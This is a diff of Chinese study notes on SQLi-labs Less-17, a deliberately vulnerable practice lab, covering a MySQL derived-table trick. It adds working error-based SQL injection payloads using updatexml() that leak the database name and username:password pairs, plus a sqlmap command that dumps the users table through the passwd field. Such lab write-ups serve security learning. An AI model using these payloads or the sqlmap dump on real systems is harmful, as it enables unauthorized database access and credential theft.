@@ -28,9 +28,21 @@ uname=admin
 这里MySQL 不允许在 UPDATE 的**子查询**里直接 SELECT 同一张表
 需要包一层派生表
 **`(select * from users) a` 相当于 MySQL 先把 users 表的数据拷一份临时表 `a`，然后子查询读临时表，不再跟 UPDATE 的表冲突**
+
+爆表名
 ```sql
 uname=admin&passwd=1' and updatexml(1,concat(0x7e,(database())),1) and '1'='1
 ```
+...
+爆数据 //派生表分段取
+第1段 (1-32位)
 
- 
- 
+uname=admin&passwd=1' and updatexml(1,concat(0x7e,substr((select group_concat(a.username,0x3a,a.password) from (select * from users) a),1,32)),1) and '1'='1
+![](assets/Less-17/file-20260531155402620.png)
+
+...
+
+---
+**sqlmap**
+指定paaswd注入点
+sqlmap -u "ip/Less-17/" --data="uname=Dumb&passwd=admin" --batch -p passwd -D security -T users --dump --level=3
